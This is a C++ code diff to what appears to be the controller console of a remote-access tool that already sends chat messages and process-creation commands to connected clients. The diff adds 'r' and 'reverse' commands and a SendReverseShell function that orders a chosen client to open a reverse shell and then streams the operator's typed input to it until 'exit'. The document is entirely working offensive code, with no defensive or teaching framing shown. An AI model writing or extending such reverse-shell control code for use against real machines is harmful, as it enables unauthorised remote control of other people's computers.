@@ -37,6 +37,8 @@ void Entrypoint::Startup()
 	_commands["chat"] = [this] { SendChatMessage(); };
 	_commands["p"] = [this] { SendCreateProcess(); };
 	_commands["process"] = [this] { SendCreateProcess(); };
+	_commands["r"] = [this] { SendReverseShell(); };
+	_commands["reverse"] = [this] { SendReverseShell(); };
 	_commands["l"] = [this] { ListClients(); };
 	_commands["list"] = [this] { ListClients(); };
 
@@ -79,6 +81,46 @@ void Entrypoint::SendCreateProcess()
 		std::span(const_cast<char*>(
 			message.c_str()),
 			message.size()));
+}
+
+void Entrypoint::SendReverseShell()
+{
+	const int pos = _args.find(' ');
+
+	auto str = _args.substr(0, pos);
+	const int client = std::stoi(str);
+	std::string message = _args.substr(pos + 1);
+
+	_manager->Send(
+		client,
+		MessageType::StartReverseShell,
+		std::span(const_cast<char*>(
+			message.c_str()),
+			message.size()));
+
+	while (true)
+	{
+		std::string input;
+		std::getline(std::cin, input);
+
+		if (input == "exit")
+		{
+			_manager->Send(
+				client,
+				MessageType::StopReverseShell,
+				std::span(const_cast<char*>(
+					input.c_str()),
+					input.size()));
+			break;
+		}
+
+		_manager->Send(
+			client,
+			MessageType::ReverseShellMessage,
+			std::span(const_cast<char*>(
+				input.c_str()),
+				input.size()));
+	}
 }
 
 void Entrypoint::ListClients() const
